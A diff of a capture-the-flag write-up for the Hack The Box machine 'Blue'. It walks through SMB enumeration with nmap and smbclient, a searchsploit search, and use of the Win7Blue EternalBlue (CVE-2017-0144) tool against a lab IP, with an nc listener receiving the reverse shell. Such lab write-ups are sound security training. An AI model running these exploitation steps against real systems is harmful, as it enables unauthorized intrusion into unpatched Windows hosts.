@@ -1,3 +1,9 @@
+This is my write-up/walkthrough for [the Hack The Box machine, Blue](https://app.hackthebox.com/machines/Blue). It's a Windows machine, rated "Easy", with 10.10.10.40 as its IP address.
+
+![Alt text](/images/blue/2022-02-16-hack-the-box-blue-01.JPG "Blue Info Card")
+
+I started with an nmap scan—
+
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
 └─$ sudo nmap -sC -sV -A 10.10.10.40
@@ -63,6 +69,8 @@ Nmap done: 1 IP address (1 host up) scanned in 271.03 seconds
 
 ```
 
+—that told me I have a couple of RPC ports, port 139 (NetBIOS), and port 445 (SMB) to work with. I figured I'll start by listing the active shares on the machine:
+
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
 └─$ smbclient -L 10.10.10.40                                                                                                                                                                                130 ⨯
@@ -81,6 +89,8 @@ Unable to connect with SMB1 -- no workgroup available
 
 ```
 
+Trying to exploit a potential misconfiguration on SMB was getting me nowhere—
+
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
 └─$ smbclient -L 10.10.10.40 -U Administrator
@@ -96,6 +106,8 @@ tree connect failed: NT_STATUS_ACCESS_DENIED
 tree connect failed: NT_STATUS_ACCESS_DENIED
 ```
 
+—until I did get in, but there was nothing of note there.
+
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
 └─$ smbclient -N \\\\10.10.10.40\\Share                                                                                                                                                                       1 ⨯
@@ -107,6 +119,8 @@ smb: \> dir
                 4692735 blocks of size 4096. 592873 blocks available
 smb: \> ^C
 ```
+
+Finally, I hit a share that looked promising.
 
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
@@ -120,48 +134,6 @@ smb: \> ls
   Public                             DR        0  Tue Apr 12 03:51:29 2011
 
                 4692735 blocks of size 4096. 592862 blocks available
-smb: \> cd Public
-smb: \Public\> dir
-  .                                  DR        0  Tue Apr 12 03:51:29 2011
-  ..                                 DR        0  Tue Apr 12 03:51:29 2011
-  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
-  Documents                          DR        0  Tue Jul 14 01:08:56 2009
-  Downloads                          DR        0  Tue Jul 14 00:54:24 2009
-  Favorites                         DHR        0  Mon Jul 13 22:34:59 2009
-  Libraries                         DHR        0  Tue Jul 14 00:54:24 2009
-  Music                              DR        0  Tue Jul 14 00:54:24 2009
-  Pictures                           DR        0  Tue Jul 14 00:54:24 2009
-  Recorded TV                        DR        0  Tue Apr 12 03:51:29 2011
-  Videos                             DR        0  Tue Jul 14 00:54:24 2009
-
-                4692735 blocks of size 4096. 592862 blocks available
-smb: \Public\> get desktop.ini
-
-getting file \Public\desktop.ini of size 174 as desktop.ini (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
-smb: \Public\>
-smb: \Public\> ^C
-```
-
-```
-┌──(thatvirdiguy㉿kali)-[~]
-└─$ cat desktop.ini                                                                                                                                                                                         130 ⨯
-��
-[.ShellClassInfo]
-LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21816
-```
-
-```
-┌──(thatvirdiguy㉿kali)-[~]
-└─$ smbclient -N \\\\10.10.10.40\\Users                                                                                                                                                                     130 ⨯
-Try "help" to get a list of possible commands.
-smb: \> dir
-  .                                  DR        0  Fri Jul 21 02:56:23 2017
-  ..                                 DR        0  Fri Jul 21 02:56:23 2017
-  Default                           DHR        0  Tue Jul 14 03:07:31 2009
-  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
-  Public                             DR        0  Tue Apr 12 03:51:29 2011
-
-                4692735 blocks of size 4096. 593014 blocks available
 smb: \> cd Default\
 smb: \Default\> dir
   .                                 DHR        0  Tue Jul 14 03:07:31 2009
@@ -192,7 +164,30 @@ getting file \Default\NTUSER.DAT.LOG of size 1024 as NTUSER.DAT.LOG (1.4 KiloByt
 smb: \Default\> get NTUSER.DAT.LOG1
 getting file \Default\NTUSER.DAT.LOG1 of size 189440 as NTUSER.DAT.LOG1 (145.8 KiloBytes/sec) (average 123.1 KiloBytes/sec)
 smb: \Default\>
+smb: \Default\> cd ../
+smb: \> cd Public
+smb: \Public\> dir
+  .                                  DR        0  Tue Apr 12 03:51:29 2011
+  ..                                 DR        0  Tue Apr 12 03:51:29 2011
+  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
+  Documents                          DR        0  Tue Jul 14 01:08:56 2009
+  Downloads                          DR        0  Tue Jul 14 00:54:24 2009
+  Favorites                         DHR        0  Mon Jul 13 22:34:59 2009
+  Libraries                         DHR        0  Tue Jul 14 00:54:24 2009
+  Music                              DR        0  Tue Jul 14 00:54:24 2009
+  Pictures                           DR        0  Tue Jul 14 00:54:24 2009
+  Recorded TV                        DR        0  Tue Apr 12 03:51:29 2011
+  Videos                             DR        0  Tue Jul 14 00:54:24 2009
+
+                4692735 blocks of size 4096. 592862 blocks available
+smb: \Public\> get desktop.ini
+
+getting file \Public\desktop.ini of size 174 as desktop.ini (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
+smb: \Public\>
+smb: \Public\> ^C
 ```
+
+I then spent some time reading more about what this "`desktop.ini`" and "`NTUSER.DAT`" are, and if there is potential exploit out there in the wild for me to use, but that wasn't the right approach. I figured out the right approach when I did a `searchsploit` on "windows smb" but limited the results to Windows 7 since, as per the nmap scan, that the OS this box is running.
 
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
@@ -224,6 +219,8 @@ VideoLAN VLC Media Player 1.0.0/1.0.1 - 'smb://' URI Handling Buffer Overflow (P
 
 ```
 
+That "EternalBlue" looked promising, not just because it allowed remote code execution via SMB, but because it tied to the name of the box. Reading more on it led me to [CVE-2017-0144](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144), [this](https://research.checkpoint.com/2017/eternalblue-everything-know/) excellent explainer, and [d4t4s3c's Win7Blue](https://github.com/d4t4s3c/Win7Blue) tool to exploit this vulnerability.
+
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
 └─$ git clone https://github.com/d4t4s3c/Win7Blue.git
@@ -245,6 +242,8 @@ eternalblue_scanner.py  LICENSE  ms17_010_eternalblue.py  mysmb.py  README.md  s
 ┌──(thatvirdiguy㉿kali)-[~/Win7Blue]
 └─$ chmod +x Win7Blue.sh
 ```
+
+Once the tool was set up, all I had to do was point it to the right IP address and port number—
 
 ```
 ┌═══════════════════════════════════┐
@@ -292,6 +291,8 @@ SMB1 session setup allocate nonpaged pool success
 good response status: INVALID_PARAMETER
 done
 ```
+
+—with an `nc` listening for open connections on port 1234 on my machine.
 
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
